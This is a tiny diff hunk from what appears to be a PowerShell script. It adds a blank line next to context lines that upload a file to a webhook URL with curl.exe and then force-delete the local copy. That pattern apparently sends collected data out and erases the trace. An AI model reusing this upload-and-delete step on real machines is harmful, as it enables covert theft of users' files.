@@ -359,6 +359,7 @@
  curl.exe -F file1=@"$outpath" $hookurl
  Sleep 1
  Remove-Item -Path $outpath -force
+ 
  Add-Type -AssemblyName System.Windows.Forms
  Add-Type -AssemblyName System.Drawing
  [System.Windows.Forms.Application]::EnableVisualStyles()
